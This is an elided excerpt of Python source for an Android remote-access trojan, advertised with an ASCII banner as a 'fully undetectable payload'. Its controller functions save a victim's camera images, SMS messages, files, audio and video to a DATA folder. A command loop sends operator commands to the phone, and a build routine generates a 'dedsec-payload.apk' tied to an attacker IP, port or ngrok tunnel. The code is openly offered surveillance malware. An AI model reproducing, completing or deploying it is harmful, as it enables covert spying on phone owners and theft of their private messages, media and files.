...
DEDSEC FULLY UNDETECTABLE PAYLOAD FOR ANDROID PHONE
██████╗░███████╗██████╗░░██████╗███████╗░█████╗░
██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
██║░░██║█████╗░░██║░░██║╚█████╗░█████╗░░██║0XBITX╝
██║░░██║██╔══╝░░██║░░██║░╚═══██╗██╔══╝░░██║░░██╗
...
if not os.path.isdir(os.getcwd()+direc+"DATA"):
    os.makedirs("DATA")
...
def getImage(client):
    ...
    flag=0
    filename ="DATA"+direc+"Image_"+timestr+'.jpg'
...
def readSMS(client,data):
    ...
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "DATA"+direc+data+"_"+timestr+'.txt'
    flag =0
...
def getFile(filename,ext,data):
    fileData = "DATA"+direc+filename+"."+ext
    flag=0
...
def stopAudio(client):
    ...
    filename = "DATA"+direc+"Audio_"+timestr+".mp3"
...
def stopVideo(client):
    ...
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "DATA"+direc+"Video_"+timestr+'.mp4' 
    ...
    while True:
        ...
        while True:
            ...
            if(msg.strip() == "IMAGE"):
                ...
                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "DEDSEC!" in msg else print(msg)
            message_to_send = input("\033[1m\033[36mDEDSEC:/> \033[0m")+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("\033[1m\033[32m\t WE ARE DEDSEC!!ﾉ゛\033[0m")
                sys.exit()
...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    ...
    outFileName = output if output else "dedsec-payload.apk"
    que = queue.Queue()
